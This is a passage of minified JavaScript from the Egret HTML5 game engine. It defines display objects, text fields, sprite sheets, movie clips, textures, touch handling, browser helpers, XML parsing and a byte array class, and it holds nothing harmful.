e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this)}return __extends(i,e),Object.defineProperty(i.prototype,"graphics",{get:function(){return this._graphics||(this._graphics=new t.Graphics),this._graphics},enumerable:!0,configurable:!0}),i.prototype._render=function(t){this._graphics&&this._graphics._draw(t)},i}(t.DisplayObject);t.Shape=e,e.prototype.__class__="egret.Shape"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this)}return __extends(i,e),Object.defineProperty(i.prototype,"graphics",{get:function(){return this._graphics||(this._graphics=new t.Graphics),this._graphics},enumerable:!0,configurable:!0}),i.prototype._render=function(t){this._graphics&&this._graphics._draw(t),e.prototype._render.call(this,t)},i}(t.DisplayObjectContainer);t.Sprite=e,e.prototype.__class__="egret.Sprite"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._fontFamily="Arial",this._size=30,this._textColorString="#FFFFFF",this._textColor=16777215,this._strokeColorString="#000000",this._stroke=this._strokeColor=0,this._textAlign="left",this._verticalAlign="top",this._numLines=this._lineSpacing=0,this.measuredWidths=[]}return __extends(i,e),Object.defineProperty(i.prototype,"text",{get:function(){return this._text},set:function(t){this._text!=t&&(this._setTextDirty(),this._text=t)},enumerable:!0,configurable:!0}),i.prototype._setTextDirty=function(){this._setSizeDirty()},Object.defineProperty(i.prototype,"fontFamily",{get:function(){return this._fontFamily},set:function(t){this._fontFamily!=t&&(this._setTextDirty(),this._fontFamily=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"size",{get:function(){return this._size},set:function(t){this._size!=t&&(this._setTextDirty(),this._size=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"italic",{get:function(){return this._italic},set:function(t){this._italic!=t&&(this._setTextDirty(),this._italic=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"bold",{get:function(){return this._bold},set:function(t){this._bold!=t&&(this._setTextDirty(),this._bold=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"textColor",{get:function(){return this._textColor},set:function(e){this._textColor!=e&&(this._setTextDirty(),this._textColor=e,this._textColorString=t.toColorString(e))},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"strokeColor",{get:function(){return this._strokeColor},set:function(e){this._strokeColor!=e&&(this._setTextDirty(),this._strokeColor=e,this._strokeColorString=t.toColorString(e))},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"stroke",{get:function(){return this._stroke},set:function(t){this._stroke!=t&&(this._setTextDirty(),this._stroke=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"textAlign",{get:function(){return this._textAlign},set:function(t){this._textAlign!=t&&(this._setTextDirty(),this._textAlign=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"verticalAlign",{get:function(){return this._verticalAlign},set:function(t){this._verticalAlign!=t&&(this._setTextDirty(),this._verticalAlign=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lineSpacing",{get:function(){return this._lineSpacing},set:function(t){this._lineSpacing!=t&&(this._setTextDirty(),this._lineSpacing=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"numLines",{get:function(){return this._numLines},enumerable:!0,configurable:!0}),i.prototype._render=function(t){this.drawText(t,!1),this._clearDirty()},i.prototype._measureBounds=function(){return this.drawText(t.MainContext.instance.rendererContext,!0)},i.prototype.drawText=function(e,i){var n=this.getTextLines(e);if(!n)return t.Rectangle.identity.initialize(0,0,0,0);var r=n.length,s=.5*this._size,o=this._size+this._lineSpacing,a=r*o-this._lineSpacing;this._textHeight=a;var h=this._hasHeightSet?this._explicitHeight:Number.POSITIVE_INFINITY;if(this._hasHeightSet&&a<h){l=0;this._verticalAlign==t.VerticalAlign.MIDDLE?l=.5:this._verticalAlign==t.VerticalAlign.BOTTOM&&(l=1),s+=l*(h-a)}var l=s=Math.round(s),p=0;this._textAlign==t.HorizontalAlign.CENTER?p=.5:this._textAlign==t.HorizontalAlign.RIGHT&&(p=1);var u,d=this.measuredWidths;u=this._hasWidthSet?this._explicitWidth:this._textWidth;for(var c=Number.POSITIVE_INFINITY,_=0;_<r;_++){var g=n[_],f=Math.round((u-d[_])*p);f<c&&(c=f),!i&&s<h&&e.drawText(this,g,f,s,u),s+=o}return t.Rectangle.identity.initialize(c,l,u,a)},i.prototype.getTextLines=function(t){i=this.text?this.text.toString():"";if(!i)return null;var e=this.measuredWidths;e.length=0,t.setupFont(this);var i,n=(i=i.split(/(?:\r\n|\r|\n)/)).length,r=0;if(this._hasWidthSet)for(var s=this._explicitWidth,o=0;o<n;o++){var a=i[o],h=t.measureText(a);if(h>s){for(var l="",p=0,u=a.length,d=0;d<u;d++){var c=a.charAt(d);p+(h=t.measureText(c))>s&&(0==p?(i.splice(o,0,c),e[o]=h,r<h&&(r=h),h=0,c=""):(i.splice(o,0,l),e[o]=p,r<p&&(r=p),l="",p=0),o++,n++),p+=h,l+=c}i[o]=l,e[o]=p}else e[o]=h,r<h&&(r=h)}else for(o=0;o<n;o++)a=i[o],h=t.measureText(a),e[o]=h,r<h&&(r=h);return this._textWidth=r,i},i}(t.DisplayObject);t.TextField=e,e.prototype.__class__="egret.TextField"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.DYNAMIC="dynamic",t.INPUT="input",t}();t.TextFieldType=e,e.prototype.__class__="egret.TextFieldType"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t){e.call(this);var i=t.bitmapData;this.bitmapData=i,this._textureMap={},this._sourceWidth=i.width,this._sourceHeight=i.height,this._bitmapX=t._bitmapX-t._offsetX,this._bitmapY=t._bitmapY-t._offsetY}return __extends(i,e),i.prototype.getTexture=function(t){return this._textureMap[t]},i.prototype.createTexture=function(e,i,n,r,s,o,a,h,l){void 0===o&&(o=0),void 0===a&&(a=0),void 0===h&&(h=o+r),void 0===l&&(l=a+s);var p=new t.Texture;return p._bitmapData=this.bitmapData,p._bitmapX=this._bitmapX+i,p._bitmapY=this._bitmapY+n,p._bitmapWidth=r,p._bitmapHeight=s,p._offsetX=o,p._offsetY=a,p._textureWidth=h,p._textureHeight=l,p._sourceWidth=this._sourceWidth,p._sourceHeight=this._sourceHeight,this._textureMap[e]=p},i}(t.HashObject);t.SpriteSheet=e,e.prototype.__class__="egret.SpriteSheet"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.apply(this,arguments),this._placeholderText="",this._edFontSize=14,this._textColor=16711680,this._placeholderFontSize=14,this._placeholderColor=16776960,this._preY=this._preX=0}return __extends(i,e),i.prototype._onAddToStage=function(){e.prototype._onAddToStage.call(this);var i=this.localToGlobal(),n=new t.StageText;n._open(i.x,i.y,this._explicitWidth,this._explicitHeight),this.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.onMouseDownHandler,this),this.stageText=n},i.prototype.setText=function(t){this.stageText._setText(t)},i.prototype.getText=function(){return this.stageText._getText()},i.prototype.setTextType=function(t){this.stageText._setTextType(t)},i.prototype.getTextType=function(){return this.stageText._getTextType()},i.prototype.onMouseDownHandler=function(t){},i.prototype._onRemoveFromStage=function(){this.stageText._remove()},i.prototype._measureBounds=function(){return t.Rectangle.identity},i.prototype.hitTest=function(t,e,i){return null},i}(t.DisplayObject);t.TextInput=e,e.prototype.__class__="egret.TextInput",e=function(){function t(){}return t.prototype.editBoxEditingDidBegin=function(t){},t.prototype.editBoxEditingDidEnd=function(t){},t.prototype.editBoxTextChanged=function(t,e){},t.prototype.editBoxReturn=function(t){},t}(),t.TextInputDegelete=e,e.prototype.__class__="egret.TextInputDegelete"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(e,i){t.call(this,e),this.charList=this.parseConfig(i)}return __extends(e,t),e.prototype.getTexture=function(t){var e=this._textureMap[t];if(!e){if(!(e=this.charList[t]))return null;e=this.createTexture(t,e.x,e.y,e.width,e.height,e.offsetX,e.offsetY),this._textureMap[t]=e}return e},e.prototype.parseConfig=function(t){t=(t=t.split("\r\n").join("\n")).split("\n");for(var e=this.getConfigByKey(t[3],"count"),i={},n=4;n<4+e;n++){var r=t[n],s={};i[String.fromCharCode(this.getConfigByKey(r,"id"))]=s,s.x=this.getConfigByKey(r,"x"),s.y=this.getConfigByKey(r,"y"),s.width=this.getConfigByKey(r,"width"),s.height=this.getConfigByKey(r,"height"),s.offsetX=this.getConfigByKey(r,"xoffset"),s.offsetY=this.getConfigByKey(r,"yoffset")}return i},e.prototype.getConfigByKey=function(t,e){for(var i=t.split(" "),n=0,r=i.length;n<r;n++){var s=i[n];if(e==s.substring(0,e.length))return i=s.substring(e.length+1),parseInt(i)}return 0},e}(t.SpriteSheet);t.BitmapTextSpriteSheet=e,e.prototype.__class__="egret.BitmapTextSpriteSheet"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function n(n,r){e.call(this),this.frameRate=60,n instanceof i?(t.Logger.warning("MovieClip#constructor接口参数已经变更，请尽快调整用法为 new MovieClip(data,texture)"),this.delegate=n):this.delegate=new i(n,r),this.delegate.setMovieClip(this)}return __extends(n,e),n.prototype.gotoAndPlay=function(t){this.delegate.gotoAndPlay(t)},n.prototype.gotoAndStop=function(t){this.delegate.gotoAndStop(t)},n.prototype.stop=function(){this.delegate.stop()},n.prototype.dispose=function(){this.delegate.dispose()},n.prototype.release=function(){t.Logger.warning("MovieClip#release方法即将废弃"),this.dispose()},n.prototype.getCurrentFrameIndex=function(){return t.Logger.warning("MovieClip#getCurrentFrameIndex方法即将废弃"),this.delegate._currentFrameIndex},n.prototype.getTotalFrame=function(){return t.Logger.warning("MovieClip#getTotalFrame方法即将废弃"),this.delegate._totalFrame},n.prototype.setInterval=function(e){t.Logger.warning("MovieClip#setInterval方法即将废弃,请使用MovieClip#frameRate代替"),this.frameRate=60/e},n.prototype.getIsPlaying=function(){return t.Logger.warning("MovieClip#getIsPlaying方法即将废弃"),this.delegate.isPlaying},n}(t.DisplayObjectContainer);t.MovieClip=e,e.prototype.__class__="egret.MovieClip";var i=function(){function e(e,i){this.data=e,this._currentFrameIndex=this._passTime=this._totalFrame=0,this._isPlaying=!1,this._frameData=e,this._spriteSheet=new t.SpriteSheet(i)}return e.prototype.setMovieClip=function(e){this.movieClip=e,this.bitmap=new t.Bitmap,this.movieClip.addChild(this.bitmap)},e.prototype.gotoAndPlay=function(e){this.checkHasFrame(e),this._isPlaying=!0,this._currentFrameIndex=0,this._currentFrameName=e,this._totalFrame=this._frameData.frames[e].totalFrame,this.playNextFrame(),this._passTime=0,t.Ticker.getInstance().register(this.update,this)},e.prototype.gotoAndStop=function(t){this.checkHasFrame(t),this.stop(),this._currentFrameIndex=this._passTime=0,this._currentFrameName=t,this._totalFrame=this._frameData.frames[t].totalFrame,this.playNextFrame()},e.prototype.stop=function(){this._isPlaying=!1,t.Ticker.getInstance().unregister(this.update,this)},e.prototype.dispose=function(){},e.prototype.checkHasFrame=function(e){void 0==this._frameData.frames[e]&&t.Logger.fatal("MovieClip没有对应的frame：",e)},e.prototype.update=function(t){for(var e=1e3/this.movieClip.frameRate,e=Math.floor((this._passTime%e+t)/e);1<=e;)1==e?this.playNextFrame():this.playNextFrame(!1),e--;this._passTime+=t},e.prototype.playNextFrame=function(t){void 0===t&&(t=!0);var e=this._frameData.frames[this._currentFrameName].childrenFrame[this._currentFrameIndex];if(t){t=this.getTexture(e.res);var i=this.bitmap;i.x=e.x,i.y=e.y,i.texture=t}null!=e.action&&this.movieClip.dispatchEventWith(e.action),this._currentFrameIndex++,this._currentFrameIndex==this._totalFrame&&(this._currentFrameIndex=0)},e.prototype.getTexture=function(t){var e=this._frameData.res[t],i=this._spriteSheet.getTexture(t);return i||(i=this._spriteSheet.createTexture(t,e.x,e.y,e.w,e.h)),i},e}();t.DefaultMovieClipDelegate=i,i.prototype.__class__="egret.DefaultMovieClipDelegate"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this)}return __extends(i,e),i.prototype._getText=function(){return this.inputElement.value},i.prototype._setText=function(t){this.inputElement.value=t},i.prototype._setTextType=function(t){this.inputElement.type=t},i.prototype._getTextType=function(){return this.inputElement.type},i.prototype._open=function(e,i,n,r){void 0===n&&(n=160),void 0===r&&(r=21);var s=t.StageDelegate.getInstance().getScaleX(),o=t.StageDelegate.getInstance().getScaleY(),a=document.createElement("input");a.type="text",a.style.fontSize="20px",a.style.color="#FFFFFF",a.style.borderStyle="none",a.style.background="none",a.style.width=n*s+"px",a.style.height=r*o+"px",a.style.outline="medium";var h=t.Browser.getInstance().$new("div");h.style.position="absolute",h.position.x=e*s,h.style.width=n*s+"px",h.style.height=r*o+"px",h.position.y=i*o,h.transforms(),h.appendChild(a),(e=t.Browser.getInstance().$("#StageDelegateDiv"))||(n=document.getElementById(t.StageDelegate.canvas_div_name),r=n.clientHeight,n=n.clientWidth,e=t.Browser.getInstance().$new("div"),e.id="StageDelegateDiv",e.style.position="absolute",e.style.width=n+"px",e.style.maxHeight=r+"px",e.style.margin="0px",document.getElementById(t.StageDelegate.canvas_div_name).appendChild(e),e.position.y=-r,e.transforms()),e.appendChild(h),this.div=h,this.inputElement=a},i.prototype._remove=function(){var t=this.div;t&&t.parentNode&&t.parentNode.removeChild(t)},i}(t.HashObject);t.StageText=e,e.prototype.__class__="egret.StageText"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.GET="GET",t.POST="POST",t}();t.URLRequestMethod=e,e.prototype.__class__="egret.URLRequestMethod"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.BINARY="binary",t.TEXT="text",t.VARIABLES="variables",t.TEXTURE="texture",t.SOUND="sound",t}();t.URLLoaderDataFormat=e,e.prototype.__class__="egret.URLLoaderDataFormat"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(e){void 0===e&&(e=null),t.call(this),null!==e&&this.decode(e)}return __extends(e,t),e.prototype.decode=function(t){this.variables||(this.variables={}),t=t.split("+").join(" ");for(var e,i=/[?&]?([^=]+)=([^&]*)/g;e=i.exec(t);)this.variables[decodeURIComponent(e[1])]=decodeURIComponent(e[2])},e.prototype.toString=function(){if(!this.variables)return"";var t,e=this.variables,i="",n=!0;for(t in e)n?n=!1:i+="&",i+=t+"="+e[t];return i},e}(t.HashObject);t.URLVariables=e,e.prototype.__class__="egret.URLVariables"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(i){void 0===i&&(i=null),e.call(this),this.method=t.URLRequestMethod.GET,this.url=i}return __extends(i,e),i}(t.HashObject);t.URLRequest=e,e.prototype.__class__="egret.URLRequest"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(i){void 0===i&&(i=null),e.call(this),this.dataFormat=t.URLLoaderDataFormat.TEXT,i&&this.load(i)}return __extends(i,e),i.prototype.load=function(e){this._request=e,this.data=null,t.MainContext.instance.netContext.proceed(this)},i}(t.EventDispatcher);t.URLLoader=e,e.prototype.__class__="egret.URLLoader"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._textureHeight=this._textureWidth=this._offsetY=this._offsetX=this._bitmapHeight=this._bitmapWidth=this._bitmapY=this._bitmapX=0}return __extends(i,e),Object.defineProperty(i.prototype,"textureWidth",{get:function(){return this._textureWidth},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"textureHeight",{get:function(){return this._textureHeight},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"bitmapData",{get:function(){return this._bitmapData},enumerable:!0,configurable:!0}),i.prototype._setBitmapData=function(e){var i=t.MainContext.instance.rendererContext.texture_scale_factor;this._bitmapData=e,this._sourceWidth=e.width,this._sourceHeight=e.height,this._textureWidth=this._sourceWidth*i,this._textureHeight=this._sourceHeight*i,this._bitmapWidth=this._textureWidth,this._bitmapHeight=this._textureHeight,this._offsetX=this._offsetY=this._bitmapX=this._bitmapY=0},i.prototype.getPixel32=function(t,e){return this._bitmapData.getContext("2d").getImageData(t,e,1,1).data},i}(t.HashObject);t.Texture=e,e.prototype.__class__="egret.Texture"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._bitmapData=document.createElement("canvas"),this.renderContext=t.RendererContext.createRendererContext(this._bitmapData)}return __extends(i,e),i.prototype.drawToTexture=function(e){var i=this._bitmapData,n=e.getBounds(t.Rectangle.identity);if(i.width=n.width,i.height=n.height,e._worldTransform.identity(),e.worldAlpha=1,e instanceof t.DisplayObjectContainer){this._offsetX=n.x,this._offsetY=n.y,e._worldTransform.append(1,0,0,1,-n.x,-n.y);for(var n=0,r=(i=e._children).length;n<r;n++)i[n]._updateTransform()}n=(i=t.RenderFilter.getInstance())._drawAreaList.concat(),i._drawAreaList.length=0,this.renderContext.clearScreen(),this.webGLTexture=null,(r=e.mask||e._scrollRect)&&this.renderContext.pushMask(r),e._render(this.renderContext),r&&this.renderContext.popMask(),i._drawAreaList=n,this._textureWidth=this._bitmapData.width,this._textureHeight=this._bitmapData.height,this._sourceWidth=this._textureWidth,this._sourceHeight=this._textureHeight},i}(t.Texture);t.RenderTexture=e,e.prototype.__class__="egret.RenderTexture"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.renderCost=0,this.texture_scale_factor=1}return __extends(i,e),i.prototype.clearScreen=function(){},i.prototype.clearRect=function(t,e,i,n){},i.prototype.drawImage=function(e,i,n,r,s,o,a,h,l){t.Profiler.getInstance().onDrawImage()},i.prototype.setTransform=function(t){},i.prototype.setAlpha=function(t,e){},i.prototype.setupFont=function(t){},i.prototype.measureText=function(t){return 0},i.prototype.drawText=function(e,i,n,r,s){t.Profiler.getInstance().onDrawImage()},i.prototype.strokeRect=function(t,e,i,n,r){},i.prototype.pushMask=function(t){},i.prototype.popMask=function(){},i.createRendererContext=function(t){return null},i}(t.HashObject);t.RendererContext=e,e.prototype.__class__="egret.RendererContext"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.MOUSE="mouse",t.TOUCH="touch",t.mode="touch",t}();t.InteractionMode=e,e.prototype.__class__="egret.InteractionMode"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._currentTouchTarget={},this.maxTouches=2,this.touchDownTarget={},this.lastTouchY=this.lastTouchX=-1}return __extends(i,e),i.prototype.run=function(){},i.prototype.getTouchData=function(t,e,i){var n=this._currentTouchTarget[t];return null==n&&(n={},this._currentTouchTarget[t]=n),n.stageX=e,n.stageY=i,n.identifier=t,n},i.prototype.dispatchEvent=function(e,i){t.TouchEvent.dispatchTouchEvent(i.target,e,i.identifier,i.stageX,i.stageY,!1,!1,!1,1==this.touchDownTarget[i.identifier])},i.prototype.onTouchBegan=function(e,i,n){var r=t.MainContext.instance.stage.hitTest(e,i);r&&(e=this.getTouchData(n,e,i),this.touchDownTarget[n]=!0,e.target=r,e.beginTarget=r,this.dispatchEvent(t.TouchEvent.TOUCH_BEGIN,e))},i.prototype.onTouchMove=function(e,i,n){if(e!=this.lastTouchX||i!=this.lastTouchY){this.lastTouchX=e,this.lastTouchY=i;var r=t.MainContext.instance.stage.hitTest(e,i);r&&(e=this.getTouchData(n,e,i),e.target=r,this.dispatchEvent(t.TouchEvent.TOUCH_MOVE,e))}},i.prototype.onTouchEnd=function(e,i,n){var r=t.MainContext.instance.stage.hitTest(e,i);r&&(e=this.getTouchData(n,e,i),delete this.touchDownTarget[n],n=e.beginTarget,e.target=r,this.dispatchEvent(t.TouchEvent.TOUCH_END,e),n==r?this.dispatchEvent(t.TouchEvent.TOUCH_TAP,e):e.beginTarget&&(e.target=e.beginTarget,this.dispatchEvent(t.TouchEvent.TOUCH_RELEASE_OUTSIDE,e)),delete this._currentTouchTarget[e.identifier])},i}(t.HashObject);t.TouchContext=e,e.prototype.__class__="egret.TouchContext"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this)}return __extends(e,t),e.prototype.proceed=function(t){},e}(t.HashObject);t.NetContext=e,e.prototype.__class__="egret.NetContext"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this.frameRate=60}return __extends(e,t),e.prototype.executeMainLoop=function(t,e){},e}(t.HashObject);t.DeviceContext=e,e.prototype.__class__="egret.DeviceContext"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.translate=this.isHD?function(e){return"translate3d("+e.x+"px, "+(e.y-t.MainContext.instance.stage.stageHeight)+"px, 0) "}:function(t){return"translate("+t.x+"px, "+t.y+"px) "},this.rotate=this.isHD?function(t){return"rotateZ("+t+"deg) "}:function(t){return"rotate("+t+"deg) "},this.ua=navigator.userAgent.toLowerCase();var i=this.ua.match(/micromessenger|qqbrowser|mqqbrowser|ucbrowser|360browser|baidubrowser|maxthon|ie|opera|firefox/)||this.ua.match(/chrome|safari/);switch(i&&0<i.length&&("micromessenger"==(i=i[0])&&(this.type="wechat"),this.type=i),this.type="unknow",this.type){case"firefox":this.pfx="Moz",this.isHD=!0;break;case"chrome":case"safari":this.pfx="webkit",this.isHD=!0;break;case"opera":this.pfx="O",this.isHD=!1;break;case"ie":this.pfx="ms",this.isHD=!1;break;default:this.pfx="webkit",this.isHD=!0}this.trans=this.pfx+"Transform"}return __extends(i,e),i.getInstance=function(){return null==i.instance&&(i.instance=new i),i.instance},Object.defineProperty(i.prototype,"isMobile",{get:function(){return t.Logger.warning("Browser.isMobile接口参数已经变更，请尽快调整用法为 egret.MainContext.deviceType == egret.MainContext.DEVICE_MOBILE "),t.MainContext.deviceType==t.MainContext.DEVICE_MOBILE},enumerable:!0,configurable:!0}),i.prototype.$new=function(t){return this.$(document.createElement(t))},i.prototype.$=function(e){var n=document;return(e=e instanceof HTMLElement?e:n.querySelector(e))&&(e.find=e.find||this.$,e.hasClass=e.hasClass||function(t){return this.className.match(new RegExp("(\\s|^)"+t+"(\\s|$)"))},e.addClass=e.addClass||function(t){return this.hasClass(t)||(this.className&&(this.className+=" "),this.className+=t),this},e.removeClass=e.removeClass||function(t){return this.hasClass(t)&&(this.className=this.className.replace(t,"")),this},e.remove=e.remove||function(){},e.appendTo=e.appendTo||function(t){return t.appendChild(this),this},e.prependTo=e.prependTo||function(t){return t.childNodes[0]?t.insertBefore(this,t.childNodes[0]):t.appendChild(this),this},e.transforms=e.transforms||function(){return this.style[i.getInstance().trans]=i.getInstance().translate(this.position)+i.getInstance().rotate(this.rotation)+i.getInstance().scale(this.scale)+i.getInstance().skew(this.skew),this},e.position=e.position||{x:0,y:0},e.rotation=e.rotation||0,e.scale=e.scale||{x:1,y:1},e.skew=e.skew||{x:0,y:0},e.translates=function(e,i){return this.position.x=e,this.position.y=i-t.MainContext.instance.stage.stageHeight,this.transforms(),this},e.rotate=function(t){return this.rotation=t,this.transforms(),this},e.resize=function(t,e){return this.scale.x=t,this.scale.y=e,this.transforms(),this},e.setSkew=function(t,e){return this.skew.x=t,this.skew.y=e,this.transforms(),this}),e},i.prototype.scale=function(t){return"scale("+t.x+", "+t.y+") "},i.prototype.skew=function(t){return"skewX("+-t.x+"deg) skewY("+t.y+"deg)"},i}(t.HashObject);t.Browser=e,e.prototype.__class__="egret.Browser"}(egret||(egret={})),function(t){var e=function(){function e(){}return e.parse=function(i){if(!(i=t.SAXParser.getInstance().parserXML(i))||!i.childNodes)return null;for(var n=i.childNodes.length,r=!1,s=0;s<n;s++){var o=i.childNodes[s];if(1==o.nodeType){r=!0;break}}return r?e.parseNode(o):null},e.parseNode=function(t){if(!t||1!=t.nodeType)return null;var i={};i.localName=t.localName,i.name=t.nodeName,t.namespaceURI&&(i.namespace=t.namespaceURI),t.prefix&&(i.prefix=t.prefix);for(var n=t.attributes,r=n.length,s=0;s<r;s++){var o=n[s],a=o.name;0!=a.indexOf("xmlns:")&&(i["$"+a]=o.value)}for(r=(n=t.childNodes).length,s=0;s<r;s++)(o=e.parseNode(n[s]))&&(i.children||(i.children=[]),o.parent=i,i.children.push(o));return!i.children&&(t=t.textContent.trim())&&(i.text=t),i},e.findChildren=function(t,i,n){return n?n.length=0:n=[],e.findByPath(t,i,n),n},e.findByPath=function(t,i,n){var r,s=i.indexOf(".");if(-1==s?(r=i,s=!0):(r=i.substring(0,s),i=i.substring(s+1),s=!1),t=t.children)for(var o=t.length,a=0;a<o;a++){var h=t[a];h.localName==r&&(s?n.push(h):e.findByPath(h,i,n))}},e.getAttributes=function(t,e){e?e.length=0:e=[];for(var i in t)"$"==i.charAt(0)&&e.push(i.substring(1));return e},e}();t.XML=e,e.prototype.__class__="egret.XML"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.LITTLE_ENDIAN="LITTLE_ENDIAN",t.BIG_ENDIAN="BIG_ENDIAN",t}();t.Endian=e,e.prototype.__class__="egret.Endian";var i=function(){function t(){this.length=this.position=0,this._mode="",this.maxlength=0,this._endian=e.LITTLE_ENDIAN,this.isLittleEndian=!1,this._mode="Typed array",this.maxlength=4,this.arraybytes=new ArrayBuffer(this.maxlength),this.unalignedarraybytestemp=new ArrayBuffer(16),this.endian=t.DEFAULT_ENDIAN}return Object.defineProperty(t.prototype,"endian",{get:function(){return this._endian},set:function(t){this._endian=t,this.isLittleEndian=t==e.LITTLE_ENDIAN},enumerable:!0,configurable:!0}),t.prototype.ensureWriteableSpace=function(t){this.ensureSpace(t+this.position)},t.prototype.setArrayBuffer=function(t){this.ensureSpace(t.byteLength),this.length=t.byteLength,t=new Int8Array(t),new Int8Array(this.arraybytes,0,this.length).set(t),this.position=0},Object.defineProperty(t.prototype,"bytesAvailable",{get:function(){return this.length-this.position},enumerable:!0,configurable:!0}),t.prototype.ensureSpace=function(t){if(t>this.maxlength){t=t+255&-256;var e=new ArrayBuffer(t),i=new Uint8Array(this.arraybytes,0,this.length);new Uint8Array(e,0,this.length).set(i),this.arraybytes=e,this.maxlength=t}},t.prototype.writeByte=function(t){this.ensureWriteableSpace(1),new Int8Array(this.arraybytes)[this.position++]=~~t,this.position>this.length&&(this.length=this.position)},t.prototype.readByte=function(){if(this.position>=this.length)throw"ByteArray out of bounds read. Positon="+this.position+", Length="+this.length;return new Int8Array(this.arraybytes)[this.position++]},t.prototype.readBytes=function(t,e,i){void 0===e&&(e=0),void 0===i&&(i=0),null==i&&(i=t.length),t.ensureWriteableSpace(e+i);var n=new Int8Array(t.arraybytes),r=new Int8Array(this.arraybytes);n.set(r.subarray(this.position,this.position+i),e),this.position+=i,i+e>t.length&&(t.length+=i+e-t.length)},t.prototype.writeUnsignedByte=function(t){this.ensureWriteableSpace(1),new Uint8Array(this.arraybytes)[this.position++]=255&~~t,this.position>this.length&&(this.length=this.position)},t.prototype.readUnsignedByte=function(){if(this.position>=this.length)throw"ByteArray out of bounds read. Positon="+this.position+", Length="+this.length;return new Uint8Array(this.arraybytes)[this.position++]},t.prototype.writeUnsignedShort=function(t){if(this.ensureWriteableSpace(2),0==(1&this.position)){var e=new Uint16Array(this.arraybytes);e[this.position>>1]=65535&~~t}else e=new Uint16Array(this.unalignedarraybytestemp,0,1),e[0]=65535&~~t,t=new Uint8Array(this.arraybytes,this.position,2),e=new Uint8Array(this.unalignedarraybytestemp,0,2),t.set(e);this.position+=2,this.position>this.length&&(this.length=this.position)},t.prototype.readUTFBytes=function(t){r="";t=this.position+t;for(var e=new 